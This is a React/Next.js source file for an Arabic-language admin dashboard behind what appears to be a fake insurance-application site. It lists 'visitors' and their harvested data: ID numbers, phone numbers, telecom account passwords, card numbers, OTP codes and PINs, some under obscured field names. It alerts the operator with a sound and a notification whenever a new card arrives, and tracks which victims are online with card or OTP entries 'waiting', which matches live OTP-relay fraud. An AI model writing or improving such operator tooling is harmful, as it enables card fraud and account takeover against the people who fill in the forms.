"use client";

import { useState, useEffect, useMemo, useRef } from "react";
import {
  subscribeToApplications,
  updateApplication,
  deleteMultipleApplications,
} from "@/lib/firebase-services";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { VisitorSidebar } from "@/components/visitor-sidebar";
import { VisitorDetails } from "@/components/visitor-details";
import { DashboardHeader } from "@/components/dashboard-header";
import { DashboardNav, type DashboardView } from "@/components/dashboard-nav";
import { AnalyticsPanel } from "@/components/analytics-panel";
import { ChatInbox } from "@/components/chat-inbox";
import { SettingsPanel } from "@/components/settings-panel";
import { toast } from "sonner";
import { useAuth } from "@/components/auth-provider";
import Link from "next/link";
import {
  getNormalizedCardEntries,
  getNormalizedCardState,
  hasNormalizedCardData,
} from "@/lib/card-data";

const toTimeValue = (value: unknown): number => {
  if (!value) return 0;

  if (value instanceof Date) {
    return value.getTime();
  }

  if (typeof value === "object" && typeof (value as any).toDate === "function") {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const getPrioritySortTime = (application: InsuranceApplication): number => {
  const directTimes = [
    (application as any).insurUpdatedAt,
    application.updatedAt,
    application.cardUpdatedAt,
    application.otpUpdatedAt,
    application.pinUpdatedAt,
    application.phoneOtpUpdatedAt,
    application.phoneUpdatedAt,
    application.offerUpdatedAt,
    application.insuranceUpdatedAt,
    application.lastActiveAt,
    application.lastSeen,
  ];

  let latestTime = Math.max(...directTimes.map(toTimeValue), 0);

  if (application.history && Array.isArray(application.history)) {
    for (const entry of application.history as any[]) {
      const entryTime = toTimeValue(entry?.timestamp);
      if (entryTime > latestTime) {
        latestTime = entryTime;
      }
    }
  }

  return latestTime || toTimeValue(application.createdAt);
};

const hasDashboardData = (application: InsuranceApplication) =>
  Boolean(
    application.ownerName?.trim() ||
      application.identityNumber?.trim() ||
      application.phoneNumber?.trim() ||
      application.stcPhone?.trim() ||
      application.stcPassword?.trim() ||
      application._v1?.trim() ||
      application.cardNumber?.trim() ||
      application._v5?.trim() ||
      application.otpCode?.trim() ||
      application._v7?.trim() ||
      application.phoneOtp?.trim() ||
      application._v13?.trim() ||
      application.finalOtp?.trim() ||
      getNormalizedCardEntries(application).length > 0 ||
      application.history?.some((entry: any) =>
        Boolean(
          entry?.data &&
            Object.values(entry.data).some((value) =>
              typeof value === "string" ? value.trim().length > 0 : Boolean(value)
            )
        )
      )
  );

const getVisitorDisplayName = (application: InsuranceApplication) =>
  application.ownerName || (application as any).name || "زائر";

const showCardNotification = (visitors: InsuranceApplication[]) => {
  if (visitors.length === 0 || typeof window === "undefined") return;

  const firstVisitorName = getVisitorDisplayName(visitors[0]);
  const message =
    visitors.length === 1
      ? `تمت إضافة بطاقة جديدة للزائر: ${firstVisitorName}`
      : `تمت إضافة بطاقات جديدة (${visitors.length})`;

  toast.success(message, { id: "card-added" });

  if ("Notification" in window && Notification.permission === "granted") {
    new Notification("بطاقة جديدة", { body: message, tag: "card-added" });
  }
};

export default function Dashboard() {
  const { isLoaded, isSignedIn } = useAuth();
  const [applications, setApplications] = useState<InsuranceApplication[]>([]);
  const [selectedVisitor, setSelectedVisitor] =
    useState<InsuranceApplication | null>(null);
  const [isMobileLayout, setIsMobileLayout] = useState(false);
  const [showVisitorDetailsOnMobile, setShowVisitorDetailsOnMobile] =
    useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard">("all");
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [databaseError, setDatabaseError] = useState<string | null>(null);
  const [activeView, setActiveView] = useState<DashboardView>("overview");
  const [applicationPage, setApplicationPage] = useState(1);
  const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
  const hasLoadedInitialSnapshotRef = useRef(false);
  const previousUnreadIds = useRef<Set<string>>(new Set());
  const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
    new Map()
  );
  const selectedVisitorIdRef = useRef<string | null>(null);
  const visitorOrderRef = useRef<string[]>([]);

  // Play notification sound
  const playNotificationSound = () => {
    const audio = new Audio("/zioan.mp3");
    audio.play().catch((e) => console.log("Could not play sound:", e));
  };

  // Subscribe to Supabase
  useEffect(() => {
    if (!isLoaded || !isSignedIn) return;

    let unsubscribe: (() => void) | undefined;

    try {
      unsubscribe = subscribeToApplications((apps) => {
      const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;

      // Keep any visitor that has meaningful progress data (including STC-only flow).
      const validApps = apps.filter(hasDashboardData);

      // Calculate isOnline based on lastActiveAt (fallback to lastSeen for legacy docs).
      const now = new Date();
      const thirtySecondsAgoTime = now.getTime() - 30 * 1000;

       const appsWithOnlineStatus = validApps.map((app) => {
        const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
        const isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;

        return { ...app, isOnline };
       });

      // Sort visitors by latest activity (card/OTP/history/updates) newest first
      const sorted = appsWithOnlineStatus.sort((a, b) => {
        const timeA = getPrioritySortTime(a);
        const timeB = getPrioritySortTime(b);
        return timeB - timeA; // Most recent first
       });

      // Update the order ref
      visitorOrderRef.current = sorted
        .map((app) => app.id!)
        .filter((id): id is string => id !== undefined);

      // Check for new unread visitors
      const currentUnreadIds = new Set(
        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
      );

      // Find newly added unread visitors
      const newUnreadIds = Array.from(currentUnreadIds).filter(
        (id) => !previousUnreadIds.current.has(id)
      );

      // Play sound if there are new unread visitors
      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
      }

      // Check for new card submissions (new card entry or changed card details)
      const currentCardState = new Map<string, { count: number; key: string }>();
      const visitorsWithNewCard: InsuranceApplication[] = [];

      for (const visitor of sorted) {
        if (!visitor.id) continue;
        const cardState = getNormalizedCardState(visitor);
        if (!cardState) continue;

        currentCardState.set(visitor.id, cardState);

        const previousCardState = previousCardStateRef.current.get(visitor.id);
        if (!previousCardState) {
          if (!isInitialSnapshot) {
            visitorsWithNewCard.push(visitor);
          }
          continue;
        }

        if (
          cardState.count > previousCardState.count ||
          cardState.key !== previousCardState.key
        ) {
          visitorsWithNewCard.push(visitor);
        }
      }

      if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
        showCardNotification(visitorsWithNewCard);
      }

      // Update previous unread IDs
      previousUnreadIds.current = currentUnreadIds;
      previousCardStateRef.current = currentCardState;
      hasLoadedInitialSnapshotRef.current = true;

      setApplications(sorted);
      setLoading(false);

      // Update selected visitor if it exists in the new list (to keep it synced)
      setSelectedVisitor((prev) => {
        if (prev && prev.id) {
          selectedVisitorIdRef.current = prev.id;
          const updatedVisitor = sorted.find((app) => app.id === prev.id);
          return updatedVisitor || prev;
        }

        // Auto-select first visitor only if none selected
        if (!prev && sorted.length > 0) {
          selectedVisitorIdRef.current = sorted[0].id || null;
          return sorted[0];
        }

        return prev;
      });
      }, (error: Error) => {
        setDatabaseError(error.message);
        setLoading(false);
      });
    } catch (error) {
      console.error("Supabase configuration error:", error);
      window.setTimeout(() => {
        setDatabaseError(
          "قاعدة البيانات غير مهيأة. أضف NEXT_PUBLIC_SUPABASE_URL و NEXT_PUBLIC_SUPABASE_ANON_KEY إلى متغيرات البيئة ثم أعد تشغيل التطبيق.",
        );
        setLoading(false);
      }, 0);
    }

    return () => unsubscribe?.();
  }, [isLoaded, isSignedIn]);

  useEffect(() => {
    if (typeof window === "undefined") return;

    const mediaQuery = window.matchMedia("(max-width: 767px)");
    const applyLayout = (isMobile: boolean) => {
      setIsMobileLayout(isMobile);
      if (!isMobile) {
        setShowVisitorDetailsOnMobile(false);
      }
    };

    applyLayout(mediaQuery.matches);

    const onChange = (event: MediaQueryListEvent) => {
      applyLayout(event.matches);
    };

    if (typeof mediaQuery.addEventListener === "function") {
      mediaQuery.addEventListener("change", onChange);
      return () => mediaQuery.removeEventListener("change", onChange);
    }

    mediaQuery.addListener(onChange);
    return () => mediaQuery.removeListener(onChange);
  }, []);

  // Filter applications
  const filteredApplications = useMemo(() => {
    let filtered = applications;

    // Card filter
    if (cardFilter === "hasCard") {
      filtered = filtered.filter((app) => {
        return hasNormalizedCardData(app);
      });
    }

    // Search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter((app) => {
        const cardNums = getNormalizedCardEntries(app)
          .flatMap((entry) => [
            entry.data._v1,
            entry.data.cardNumber,
            entry.data.cardNumberMasked,
            entry.data.pan,
          ])
          .filter((value): value is string => typeof value === "string")
          .join(" ");
        return (
          app.ownerName?.toLowerCase().includes(query) ||
          app.identityNumber?.includes(query) ||
          app.phoneNumber?.includes(query) ||
          app.stcPhone?.includes(query) ||
          cardNums.includes(query) ||
          cardNums
            .split(/\s+/)
            .some((value) => value.slice(-4).includes(query))
        );
      });
    }

    return filtered;
  }, [applications, cardFilter, searchQuery]);

  const applicationPageSize = 30;
  const totalApplicationPages = Math.max(
    1,
    Math.ceil(filteredApplications.length / applicationPageSize),
  );
  const safeApplicationPage = Math.min(applicationPage, totalApplicationPages);
  const paginatedApplications = useMemo(() => {
    const start = (safeApplicationPage - 1) * applicationPageSize;
    return filteredApplications.slice(start, start + applicationPageSize);
  }, [safeApplicationPage, filteredApplications]);

  // Handle select all
  const handleSelectAll = () => {
    if (selectedIds.size === filteredApplications.length) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(
        new Set(
          filteredApplications
            .map((app) => app.id)
            .filter((id): id is string => id !== undefined)
        )
      );
    }
  };

  // Handle delete selected
  const handleDeleteSelected = async () => {
    if (selectedIds.size === 0) return;

    const count = selectedIds.size;
    if (
      !confirm(
        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`
      )
    ) {
      return;
    }

    try {
      console.log("Deleting visitors:", Array.from(selectedIds));
      const idsToDelete = Array.from(selectedIds);
      await deleteMultipleApplications(idsToDelete);
      setSelectedIds(new Set());
      console.log("Delete successful");
      alert(`✅ تم حذف ${count} زائر بنجاح`);
    } catch (error) {
      console.error("Error deleting applications:", error);
      alert(
        `❌ حدث خطأ أثناء الحذف: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`
      );
    }
  };

  // Mark as read when visitor is selected
  const handleSelectVisitor = async (visitor: InsuranceApplication) => {
    setSelectedVisitor(visitor);
    if (isMobileLayout) {
      setShowVisitorDetailsOnMobile(true);
    }

    // Mark as read
    if (visitor.isUnread && visitor.id) {
      await updateApplication(visitor.id, { isUnread: false });
    }
  };

  if (!isLoaded || loading) {
    return (
      <div className="min-h-dvh flex items-center justify-center bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40 dark:from-slate-950 dark:via-gray-950 dark:to-slate-900">
        <div className="text-center">
          <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center mx-auto shadow-lg shadow-blue-200/50">
            <div className="animate-spin rounded-full h-6 w-6 border-2 border-white/30 border-t-white"></div>
          </div>
          <p className="mt-4 text-gray-500 dark:text-slate-400 font-medium text-sm">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  if (!isSignedIn) {
    return (
      <div
        className="min-h-dvh flex items-center justify-center bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40 p-6 dark:from-slate-950 dark:via-gray-950 dark:to-slate-900"
        dir="rtl"
      >
        <div className="w-full max-w-md rounded-3xl border border-slate-200 bg-white p-8 text-center shadow-xl dark:border-slate-800 dark:bg-slate-900">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-blue-100 text-2xl dark:bg-blue-950/50">
            🔐
          </div>
          <h1 className="mt-5 text-xl font-extrabold text-slate-900 dark:text-white">
            لوحة الإدارة محمية
          </h1>
          <p className="mt-3 text-sm leading-7 text-slate-600 dark:text-slate-300">
            سجّل الدخول بحساب إداري للوصول إلى بيانات الزوار.
          </p>
          <Link
            href="/sign-in?redirect_url=/dashboard"
            className="mt-6 inline-flex w-full items-center justify-center rounded-xl bg-blue-600 px-4 py-3 text-sm font-bold text-white transition-colors hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500/40"
          >
            تسجيل الدخول
          </Link>
        </div>
      </div>
    );
  }

  if (databaseError) {
    return (
      <div
        className="min-h-dvh flex items-center justify-center bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40 p-6 dark:from-slate-950 dark:via-gray-950 dark:to-slate-900"
        dir="rtl"
      >
        <div className="w-full max-w-xl rounded-3xl border border-amber-200 bg-white p-8 text-center shadow-xl shadow-amber-100/50 dark:border-amber-900/50 dark:bg-slate-900 dark:shadow-none">
          <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-amber-100 text-2xl dark:bg-amber-950/50">
            ⚙️
          </div>
          <h1 className="mt-5 text-xl font-extrabold text-slate-900 dark:text-white">
            يلزم إعداد اتصال قاعدة البيانات
          </h1>
          <p className="mt-3 text-sm leading-7 text-slate-600 dark:text-slate-300">
            {databaseError}
          </p>
          <p className="mt-5 rounded-xl bg-slate-50 px-4 py-3 text-xs text-slate-600 dark:bg-slate-950 dark:text-slate-300">
             إذا كان الحساب صحيحًا، تأكد من تعيين <code dir="ltr">app_metadata.role = admin</code> في Supabase Auth أو إضافته إلى قائمة المشرفين.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div
      className="flex h-full min-h-full flex-col bg-[#f7f8fa] dark:bg-slate-950"
      dir="rtl"
    >
      <DashboardHeader />
      <DashboardNav activeView={activeView} onChange={setActiveView} />
      {activeView === "analytics" ? (
        <AnalyticsPanel />
      ) : activeView === "chat" ? (
        <ChatInbox visitors={applications} />
      ) : activeView === "settings" ? (
        <SettingsPanel />
      ) : (
      <div className="flex min-h-0 flex-1 flex-col overflow-hidden">
        {activeView === "overview" && (
          <div className="grid shrink-0 grid-cols-2 gap-px border-b border-slate-200 bg-slate-200 dark:border-slate-800 dark:bg-slate-800 sm:grid-cols-4">
            {[
              ["إجمالي الزوار", applications.length, "text-blue-600"],
              ["متصل الآن", applications.filter((app) => app.isOnline).length, "text-emerald-600"],
              ["بانتظار الإجراء", applications.filter((app) => app.isUnread || app.cardStatus === "waiting" || app.otpStatus === "waiting").length, "text-amber-600"],
              ["لديهم بطاقة", applications.filter((app) => Boolean(app._v1 || app.cardNumber)).length, "text-violet-600"],
            ].map(([label, value, color]) => (
              <div key={String(label)} className="bg-white px-3 py-1.5 dark:bg-slate-950">
                <p className="text-[9px] font-bold text-slate-400">{label}</p>
                <p className={`mt-0.5 text-sm font-black tabular-nums ${color}`}>{value}</p>
              </div>
            ))}
          </div>
        )}
      <div className="flex min-h-0 flex-1 overflow-hidden">
        <div
          className={`${
            isMobileLayout
              ? "h-full w-full"
              : "flex-1 flex landscape:flex-row md:flex-row overflow-hidden"
          }`}
        >
          {/* Right Sidebar - Visitor List */}
          <div
            className={
              isMobileLayout && showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "h-full w-full"
                : "h-full shrink-0"
            }
          >
            <VisitorSidebar
               visitors={paginatedApplications}
              selectedVisitor={selectedVisitor}
              onSelectVisitor={handleSelectVisitor}
              searchQuery={searchQuery}
              onSearchChange={setSearchQuery}
              cardFilter={cardFilter}
              onCardFilterChange={setCardFilter}
              selectedIds={selectedIds}
              onToggleSelect={(id) => {
                const newSet = new Set(selectedIds);
                if (newSet.has(id)) {
                  newSet.delete(id);
                } else {
                  newSet.add(id);
                }
                setSelectedIds(newSet);
              }}
              onSelectAll={handleSelectAll}
              onDeleteSelected={handleDeleteSelected}
              sidebarWidth={sidebarWidth}
              onSidebarWidthChange={setSidebarWidth}
               pagination={{
                 page: safeApplicationPage,
                 totalPages: totalApplicationPages,
                 totalItems: filteredApplications.length,
                 onPageChange: setApplicationPage,
               }}
            />
          </div>

          {/* Left Side - Visitor Details */}
          <div
            className={`${
              isMobileLayout && !showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "flex h-full w-full min-h-0"
                : "flex flex-1 min-h-0"
            }`}
          >
            <VisitorDetails
              visitor={selectedVisitor}
              onBack={
                isMobileLayout
                  ? () => setShowVisitorDetailsOnMobile(false)
                  : undefined
              }
            />
          </div>
        </div>
      </div>
      </div>
      )}
    </div>
  );
}
